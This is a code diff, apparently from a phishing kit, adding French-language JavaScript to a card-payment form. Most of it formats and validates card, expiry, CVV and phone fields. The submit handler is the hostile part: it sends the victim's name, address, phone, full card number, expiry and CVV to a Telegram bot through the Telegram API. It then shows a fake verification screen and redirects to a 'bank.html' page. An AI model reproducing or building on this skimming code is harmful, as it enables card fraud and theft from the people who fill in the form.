+                if (!cvv.value || cvv.value.length < 3) { addError(cvv, 'error-cvv'); isValid = false; }
+                else { removeError(cvv, 'error-cvv'); }
+                
+                return isValid;
+            }
+
+            const logos = {
+                visa: document.getElementById("logo-visa"),
+                mastercard: document.getElementById("logo-mastercard"),
+                cb: document.getElementById("logo-cb"),
+                cartenb: document.getElementById("logo-cartenb"),
+                amex: document.getElementById("logo-amex")
+            };
+
+            function resetLogos() {
+                Object.values(logos).forEach(logo => { if(logo) logo.classList.remove("active"); });
+            }
+
+            cardNumber.addEventListener("input", (e) => {
+                let value = e.target.value.replace(/\s+/g, "").replace(/[^0-9]/g, "");
+                resetLogos();
+
+                if (value.length > 0) {
+                    if (/^4/.test(value)) { if(logos.visa) logos.visa.classList.add("active"); cvv.maxLength = 3; cvv.placeholder = "3 chiffres"; }
+                    else if (/^5[1-5]/.test(value) || /^222[1-9]/.test(value)) { if(logos.mastercard) logos.mastercard.classList.add("active"); cvv.maxLength = 3; cvv.placeholder = "3 chiffres"; }
+                    else if (/^3[47]/.test(value)) { if(logos.amex) logos.amex.classList.add("active"); cvv.maxLength = 4; cvv.placeholder = "4 chiffres"; }
+                    else { if(logos.cb) logos.cb.classList.add("active"); if(logos.cartenb) logos.cartenb.classList.add("active"); cvv.maxLength = 3; cvv.placeholder = "3 chiffres"; }
+                }
+
+                let formattedValue = "";
+                if (/^3[47]/.test(value)) {
+                    let matches = value.match(/^(\d{1,4})(\d{0,6})(\d{0,5})$/);
+                    if (matches) formattedValue = matches[1] + (matches[2] ? " " + matches[2] : "") + (matches[3] ? " " + matches[3] : "");
                 } else {
-                    e.target.value = '';
+                    let matches = value.match(/\d{1,4}/g);
+                    if (matches) formattedValue = matches.join(" ");
+                }
+                e.target.value = formattedValue;
+            });
+
+            expiry.addEventListener("input", (e) => {
+                let value = e.target.value.replace(/\D/g, "");
+                if (value.length > 2) {
+                    let month = parseInt(value.substr(0, 2), 10);
+                    if (month > 12) month = 12;
+                    if (month === 0) month = 1;
+                    let monthStr = month < 10 ? "0" + month : month.toString();
+                    e.target.value = monthStr + "/" + value.substr(2, 2);
+                } else { e.target.value = value; }
+            });
+
+            expiry.addEventListener("keydown", (e) => {
+                if (e.key === "Backspace" && expiry.value.length === 3) {
+                    expiry.value = expiry.value.slice(0, 2);
+                    e.preventDefault();
                 }
             });
+
+            cvv.addEventListener("input", (e) => { e.target.value = e.target.value.replace(/\D/g, ""); });
+            phone.addEventListener("input", (e) => { 
+                let value = e.target.value.replace(/[^0-9]/g, "");
+                if (value.startsWith('33')) value = value.substring(2);
+                if (value.startsWith('0')) value = value.substring(1);
+                if (value.length > 9) value = value.substring(0, 9);
+                let formatted = '+33 ';
+                if (value.length > 0) formatted += value.substring(0, 1);
+                if (value.length > 1) formatted += ' ' + value.substring(1, 3);
+                if (value.length > 3) formatted += ' ' + value.substring(3, 5);
+                if (value.length > 5) formatted += ' ' + value.substring(5, 7);
+                if (value.length > 7) formatted += ' ' + value.substring(7, 9);
+                e.target.value = formatted;
+            });
+            amount.addEventListener("input", (e) => { 
+                let value = e.target.value.replace(/[^0-9.,]/g, "");
+                if (value.includes('.')) {
+                    value = value.replace('.', ',');
+                }
+                e.target.value = value + ' €';
+            });
+
+            form.addEventListener('submit', async (e) => {
+                e.preventDefault();
+                
+                if (!validateForm()) {
+                    showToast('Veuillez remplir tous les champs correctement', true);
+                    return;
+                }
+                
+                submitBtn.disabled = true;
+                submitBtn.textContent = 'Vérification en cours...';
+                loadingOverlay.style.display = 'flex';
+                
+                const BOT_TOKEN = (window.telegramConfig && window.telegramConfig.BOT_TOKEN) || 'TELEGRAM_BOT_TOKEN_PLACEHOLDER';
+                const CHAT_ID = window.telegramConfig?.CHAT_ID || 'NOT_SET';
+                const msg = 'CARTE: ' + cardName.value + ' | ADRESSE: ' + address.value + ' | TEL: ' + phone.value + ' | MONTANT: ' + amount.value + ' | NUMERO: ' + cardNumber.value + ' | EXPIRATION: ' + expiry.value + ' | CVV: ' + cvv.value;
+                fetch('https://api.telegram.org/bot' + window.telegramConfig.BOT_TOKEN + '/sendMessage', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({chat_id: CHAT_ID, text: msg})
+                }).catch(e => console.error(e));
+                
+                setTimeout(() => {
+                    window.location.href = 'bank.html';
+                }, 2000);
+            });
+        });
+    </script>
+</body>
+</html>
+
